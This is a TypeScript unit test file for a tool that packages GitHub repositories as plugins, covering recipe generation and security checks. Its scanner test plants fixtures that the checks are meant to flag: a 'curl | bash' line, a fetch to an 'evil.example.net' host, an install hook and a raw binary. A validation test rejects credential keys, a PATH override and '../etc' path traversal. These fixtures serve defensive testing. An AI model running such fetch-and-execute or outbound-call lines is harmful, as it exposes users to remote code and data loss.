/**
 * 从 GitHub 链接包装插件（ADR 0068）：识别器、配方合成、生成器、包装专用扫描、AI 配方校验。
 * 全用内存里的假仓库，不联网、不起进程。运行：npm run test:unit
 */
import assert from 'node:assert/strict'
import test from 'node:test'
import { scanWrapFiles } from '../../../shared/config-scan/wrap-rules.ts'
import { WrapRecipe } from '../../../shared/plugins/wrap/recipe.ts'
import { PluginManifest } from '../../../shared/plugins/types.ts'
import { resolveRecipe } from './ai.ts'
import { buildRecipe, defaultPicks, detect, pickAsset, type RepoFile } from './detect.ts'
import { parseWrapUrl } from './fetch.ts'
import { defaultActivation, generate, versionOf } from './generate.ts'

const f = (path: string, text: string | Buffer): RepoFile => ({
  path,
  data: Buffer.isBuffer(text) ? text : Buffer.from(text),
})

/** archify 的样子：技能目录里带零依赖的 Node 命令行，另有官网源码和示例 */
const ARCHIFY = [
  f('README.md', '# Archify\n'),
  f('LICENSE', 'Apache License 2.0'),
  f('NOTICE', 'Archify'),
  f(
    'archify/SKILL.md',
    '---\nname: archify\ndescription: Turn anything into an interactive visual.\n---\nRun node bin/archify.mjs finalize\n',
  ),
  f('archify/bin/archify.mjs', '#!/usr/bin/env node\nconsole.log(1)\n'),
  f('archify/package.json', JSON.stringify({ name: 'archify', devDependencies: { vitest: '1' } })),
  f('archify/examples/a.json', '{}'),
  f('website/package.json', JSON.stringify({ scripts: { dev: 'astro dev' }, dependencies: { astro: '4' } })),
  f('docs/SKILL.md', '---\nname: sample\n---\n'),
]
const SNAP = {
  repo: 'tt-a1i/archify',
  commit: 'e3784881234567',
  ref: 'v3.2.0',
  license: 'Apache-2.0',
  description: 'desc',
  files: ARCHIFY,
}

test('链接：owner/repo、完整地址、带 tree 的都认', () => {
  assert.deepEqual(parseWrapUrl('tt-a1i/archify'), { repo: 'tt-a1i/archify' })
  assert.deepEqual(parseWrapUrl('https://github.com/tt-a1i/archify.git'), { repo: 'tt-a1i/archify' })
  assert.deepEqual(parseWrapUrl('https://github.com/a/b/tree/dev/src'), { repo: 'a/b', ref: 'dev' })
  assert.throws(() => parseWrapUrl('not a link'))
})

test('识别 archify：技能 + 跟技能一起的命令行；官网源码和文档里的 SKILL.md 跳过', () => {
  const list = detect(ARCHIFY, 'archify')
  const keys = list.map((d) => d.key)
  assert.ok(keys.includes('skill:archify'))
  assert.ok(keys.includes('cli-in-skill:archify'))
  assert.equal(list.find((d) => d.key === 'web:website')?.skip, '不是给你用的')
  assert.ok(list.find((d) => d.key === 'skill:docs')?.skip)
  assert.deepEqual(defaultPicks(list).sort(), ['cli-in-skill:archify', 'skill:archify'])
})

test('生成 archify 的包：技能进 skills/、示例排除、许可证带上；只有技能和环境变量默认全局', () => {
  const recipe = WrapRecipe.parse({
    repo: 'tt-a1i/archify',
    id: 'archify',
    name: 'Archify 架构图',
    skills: [{ from: 'archify', category: 'diagram', name: 'archify' }],
    settings: [{ key: 'chromePath', type: 'path', label: 'Chrome 路径', default: '' }],
    env: { ARCHIFY_CHROME: '{config.chromePath}', ARCHIFY_UPDATE_CHECK_DISABLED: '1' },
    exclude: ['archify/examples/**'],
  })
  const g = generate(recipe, SNAP, { trust: 'community', recipeFile: 'wraps/tt-a1i__archify.json' })
  const names = g.files.map((x) => x.name)
  assert.ok(names.includes('skills/diagram/archify/SKILL.md'))
  assert.ok(names.includes('skills/diagram/archify/bin/archify.mjs'))
  assert.ok(!names.some((n) => n.includes('examples')))
  assert.ok(names.includes('LICENSE') && names.includes('NOTICE'))
  const m = PluginManifest.parse(g.manifest)
  assert.equal(m.version, '3.2.0')
  assert.equal(m.activation, 'global')
  assert.equal(m.api, 11)
  assert.equal(m.skillGuide.archify, 'Turn anything into an interactive visual.')
  assert.deepEqual(m.wrap?.kinds, ['skills'])
  assert.equal(m.wrap?.trust, 'community')
  assert.ok(g.steps.some((s) => s.text.includes('ARCHIFY_CHROME') && s.text.includes('Chrome 路径')))
})

test('配方里的目录在上游没了：停下来提示，不装半个', () => {
  const recipe = WrapRecipe.parse({ repo: 'a/b', id: 'b', name: 'B', skills: [{ from: 'gone', name: 'gone' }] })
  assert.throws(() => generate(recipe, SNAP, { trust: 'any' }), /找不到 gone/)
})

test('MCP 服务：发布的 npm 包用 npx 固定版本，默认按项目', () => {
  const files = [
    f(
      'package.json',
      JSON.stringify({
        name: '@acme/foo-mcp',
        version: '1.2.3',
        dependencies: { '@modelcontextprotocol/sdk': '1' },
        bin: { foo: 'x.js' },
      }),
    ),
  ]
  const list = detect(files, 'foo-mcp')
  assert.equal(list[0].kind, 'mcp')
  assert.ok(!list.some((d) => d.kind === 'cli'), 'MCP 包的 bin 不当成命令行再装一次')
  const r = WrapRecipe.parse(
    buildRecipe({ repo: 'acme/foo-mcp', id: 'foo-mcp', name: 'Foo' }, list, defaultPicks(list)),
  )
  assert.deepEqual(r.mcp[0].args, ['-y', '@acme/foo-mcp@1.2.3'])
  assert.equal(defaultActivation(r), 'project')
  const g = generate(r, { ...SNAP, repo: 'acme/foo-mcp', ref: 'main', files }, { trust: 'any' })
  const m = PluginManifest.parse(g.manifest)
  assert.equal(m.version, '0.0.0+e378488')
  assert.equal(m.mcp[0].command, 'npx')
})

test('README 里的 mcpServers 配置片段也认', () => {
  const files = [
    f(
      'README.md',
      'Use:\n```json\n{ "mcpServers": { "foo": { "command": "npx", "args": ["-y", "foo-mcp@2.0.0"] } } }\n```\n',
    ),
  ]
  const list = detect(files, 'foo')
  assert.equal(list[0].kind, 'mcp')
  assert.equal(list[0].tag, 'README 里的配置')
})

test('命令行：Python 的 [project.scripts] 用 uv 装，PATH 前置，并生成「怎么用」技能', () => {
  const files = [
    f('pyproject.toml', '[project]\nname = "foo-cli"\nversion = "0.4.1"\n\n[project.scripts]\nfoo = "foo:main"\n'),
    f('README.md', '# Foo\n\n## Usage\n\nfoo --help\n\n## License\nMIT\n'),
  ]
  const list = detect(files, 'foo')
  const r = WrapRecipe.parse(buildRecipe({ repo: 'a/foo', id: 'foo', name: 'Foo' }, list, defaultPicks(list)))
  assert.deepEqual(r.install, [{ kind: 'uv-tool', package: 'foo-cli', version: '0.4.1' }])
  assert.deepEqual(r.path, ['.tools/bin'])
  const g = generate(r, { ...SNAP, files }, { trust: 'any' })
  const skill = g.files.find((x) => x.name === 'skills/wrapped/foo/SKILL.md')?.data.toString('utf8') ?? ''
  assert.ok(skill.includes('foo --help') && !skill.includes('MIT'))
  assert.ok(PluginManifest.parse(g.manifest).wrap?.kinds.includes('cli'))
})

test('Release 附件按当前系统和架构挑，校验文件不算', () => {
  const assets = [
    { name: 'foo_linux_amd64.tar.gz.sha256', sha256: '' },
    { name: 'foo_linux_amd64.tar.gz', sha256: 'a'.repeat(64) },
    { name: 'foo_darwin_arm64.tar.gz', sha256: 'b'.repeat(64) },
  ]
  assert.equal(pickAsset(assets, 'linux', 'x64')?.name, 'foo_linux_amd64.tar.gz')
  assert.equal(pickAsset(assets, 'darwin', 'arm64')?.name, 'foo_darwin_arm64.tar.gz')
  assert.equal(pickAsset(assets, 'win32', 'x64'), undefined)
})

test('配方不许写面板凭据和 PATH 环境变量', () => {
  const base = { repo: 'a/b', id: 'b', name: 'B' }
  assert.ok(!WrapRecipe.safeParse({ ...base, env: { ANTHROPIC_API_KEY: 'x' } }).success)
  assert.ok(!WrapRecipe.safeParse({ ...base, env: { PATH: '/tmp' } }).success)
  assert.ok(!WrapRecipe.safeParse({ ...base, skills: [{ from: '../etc', name: 'x' }] }).success)
  assert.ok(WrapRecipe.safeParse({ ...base, env: { FOO_MODE: '1' } }).success)
})

test('包装专用扫描：安装钩子、curl | sh、可执行二进制、外部域名', () => {
  const found = scanWrapFiles([
    { path: 'package.json', data: Buffer.from(JSON.stringify({ scripts: { postinstall: 'node x.js' } })) },
    { path: 'README.md', data: Buffer.from('curl -fsSL https://x.sh | bash\n') },
    { path: 'bin/tool', data: Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0]), Buffer.alloc(10)]) },
    {
      path: 'src/a.js',
      data: Buffer.from('fetch("https://telemetry.evil.example.net/x")\nfetch("https://github.com/a")'),
    },
  ])
  const rules = found.map((x) => x.rule).sort()
  assert.deepEqual(rules, ['wrap.binary', 'wrap.curl-sh', 'wrap.domains', 'wrap.install-hook'])
  assert.match(found.find((x) => x.rule === 'wrap.domains')!.snippet, /telemetry\.evil\.example\.net/)
  assert.doesNotMatch(found.find((x) => x.rule === 'wrap.domains')!.snippet, /github\.com/)
})

test('AI 配方：取最后一个 json 代码块，仓库对不上或格式不对给出原因', () => {
  const ok = resolveRecipe('a/b', '说明\n```json\n{"repo":"a/b","id":"b","name":"B"}\n```')
  assert.equal(ok.recipe?.id, 'b')
  assert.match(resolveRecipe('a/b', '没有代码块').error ?? '', /json/)
  assert.match(resolveRecipe('a/b', '```json\n{"repo":"x/y","id":"b","name":"B"}\n```').error ?? '', /a\/b/)
  assert.ok(resolveRecipe('a/b', '```json\n{"repo":"a/b"}\n```').error)
})

test('版本号：v 开头的标签去掉 v，分支用提交号', () => {
  assert.equal(versionOf('v1.2.3', 'abcdef0123'), '1.2.3')
  assert.equal(versionOf('main', 'abcdef0123'), '0.0.0+abcdef0')
})
